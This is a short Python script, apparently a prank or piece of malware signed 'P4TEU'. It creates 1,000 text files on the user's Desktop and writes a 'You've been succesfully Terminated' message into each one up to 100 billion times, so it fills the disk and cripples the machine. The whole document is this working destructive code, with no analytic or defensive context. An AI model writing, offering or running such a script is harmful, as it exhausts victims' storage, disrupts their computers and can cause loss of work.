import os

desktop = os.path.join(os.path.expanduser("~"), "Desktop")

f = [f"Youvebeenterminated{i}.txt" for i in range(1, 1001)]

for n in f:
    c = os.path.join(desktop, n)
    with open(c, "w") as f:
        for i in range(100000000000):
            f.write("You've been succesfully Terminated by P4TEU.")